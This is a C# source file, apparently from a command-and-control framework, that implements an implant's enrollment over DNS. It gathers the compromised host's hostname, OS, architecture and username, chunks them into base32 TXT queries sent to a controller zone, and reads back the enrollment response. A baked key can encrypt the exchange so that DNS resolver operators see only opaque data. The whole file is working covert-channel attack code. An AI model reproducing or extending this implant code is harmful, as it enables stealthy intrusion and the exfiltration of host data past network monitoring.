using System.Security.Cryptography;
using Google.Protobuf;
using Rod.V1;

namespace Rod.Implant.Internal;

// The DNS enroll client (architecture.md Sec 8, enrollment over DNS -- the
// full-independence step for a DNS-only target): the enroll body uploads as
// chunked TXT queries keyed by a client-chosen stream id, and the assembled
// EnrollResponse chunks back down as answers under a token. A baked
// per-artifact key seals the exchange from the first chunk (the token secret
// and the host facts never cross the resolver chain in the clear -- the wire
// the resolver operator reads carries only opaque base32); a manually minted
// token names no build, so its exchange rides plaintext and the key arrives
// in the answer.
//
// A whole source-file module riding the DNS contact module's file set (the
// bake-time transport trim): the module compiles exactly when the walk holds
// a dns- or doh-schemed entry.

/// <summary>
/// Enrolls over the DNS grammar: chunk the (sealed or plaintext) enroll body
/// into e.-queries, read the token the terminal chunk's answer names, then
/// download the EnrollResponse as a.-answers until the terminal chunk. A
/// definitive refusal surfaces as <see cref="C2.EnrollRejectedException"/>
/// exactly like every other enroll client's.
/// </summary>
internal static class DnsEnroll
{
    // The raw-byte budget of one upload chunk: the result path's own size,
    // one base32 label comfortably under the 63-byte DNS label limit.
    private const int ChunkBytes = 30;

    public static async Task<Enrollment> EnrollAsync(EnrollDial dial, CancellationToken cancellationToken)
    {
        var (_, _, zone, _) = DnsDial.Parse(dial.EnrollUrl);

        var request = new Rod.V1.EnrollRequest
        {
            StagerTokenSecret = dial.StagerToken,
            Class = dial.ImplantClass ?? string.Empty,
            PublicKey = ByteString.CopyFrom(dial.PrivateKey.ExportSubjectPublicKeyInfo()),
            ParentImplantId = dial.ParentImplantId ?? string.Empty,
            Hostname = dial.Host?.Hostname ?? string.Empty,
            Os = dial.Host?.Os ?? string.Empty,
            Arch = dial.Host?.Arch ?? string.Empty,
            Username = dial.Host?.Username ?? string.Empty,
            KillDate = dial.KillDate ?? string.Empty,
        };
        var frames = new[]
        {
            new Frame { Kind = FrameKind.EnrollRequest, Payload = ByteString.CopyFrom(request.ToByteArray()) },
        };
        var body = EnvelopeCodec.Encode(frames);
        if (dial.Profile is { SealsContacts: true }
            && EnvelopeWire.ParseBakedKey(dial.Profile.EnvelopeKey) is { } seal)
        {
            body = EnvelopeWire.SealContactBody(body, seal.KeyId, seal.Key, "rod-enroll-v1");
        }

        // Upload: one chunk per query, in order, terminal-flagged; each
        // answer is "+" (received) until the terminal chunk's answer names
        // the download token.
        var stream = RandomNumberGenerator.GetBytes(16);
        var serverCas = dial.ServerCAs is { Count: > 0 } pinned
            ? pinned.Cast<System.Security.Cryptography.X509Certificates.X509Certificate2>().ToArray()
            : null;
        string? token = null;
        var chunks = (body.Length + ChunkBytes - 1) / ChunkBytes;
        for (var index = 0; index < Math.Max(chunks, 1) && token is null; index++)
        {
            var take = Math.Min(ChunkBytes, body.Length - index * ChunkBytes);
            var chunk = new byte[Math.Max(take, 0)];
            if (take > 0)
                Array.Copy(body, index * ChunkBytes, chunk, 0, take);
            var terminal = index == Math.Max(chunks, 1) - 1;
            var name = DnsNames.EnrollName(stream, index, terminal, chunk, zone);
            var ack = await DnsDial.QueryAsync(dial.EnrollUrl, name, serverCas, cancellationToken);
            if (ack is null)
                throw new C2.EnrollRejectedException(
                    $"the dns enroll upload went unanswered at chunk {index}");
            var text = System.Text.Encoding.ASCII.GetString(ack).Trim();
            if (text.StartsWith("=", StringComparison.Ordinal)
                && DnsNames.Decode(text[1..]) is { } tokenBytes)
            {
                token = DnsNames.Encode(tokenBytes);
            }
            else if (text != "+")
            {
                throw new C2.EnrollRejectedException(
                    $"the dns enroll upload was refused at chunk {index}: {text}");
            }
        }

        if (token is null)
            throw new C2.EnrollRejectedException("the dns enroll upload never named its answer token");

        // Download: a.-answers until the terminal chunk assembles the
        // (sealed or plaintext) EnrollResponse body.
        var answer = new List<byte>();
        for (var index = 0; ; index++)
        {
            var name = DnsNames.EnrollAnswerName(DnsNames.Decode(token)!, index, zone);
            var part = await DnsDial.QueryAsync(dial.EnrollUrl, name, serverCas, cancellationToken);
            if (part is null)
                throw new C2.EnrollRejectedException(
                    $"the dns enroll answer went unanswered at chunk {index}");
            var text = System.Text.Encoding.ASCII.GetString(part).Trim();
            var terminal = text.StartsWith("t.", StringComparison.Ordinal);
            if (!terminal && !text.StartsWith("m.", StringComparison.Ordinal))
                throw new C2.EnrollRejectedException(
                    $"the dns enroll answer was malformed at chunk {index}");
            var chunkText = text[2..];
            if (chunkText.Length > 0 && DnsNames.Decode(chunkText) is { } chunk)
                answer.AddRange(chunk);
            if (terminal)
                break;
        }

        var answerBody = answer.ToArray();
        if (dial.Profile is { SealsContacts: true }
            && EnvelopeWire.ParseBakedKey(dial.Profile.EnvelopeKey) is { } open)
        {
            answerBody = EnvelopeWire.TryOpenContactBody(answerBody, open.KeyId, open.Key, "rod-enroll-response-v1")
                ?? throw new C2.EnrollRejectedException("the dns enroll answer did not verify under the baked key");
        }
        return await EnrollFrames.MaterializeAsync(answerBody, dial, "dns");
    }
}
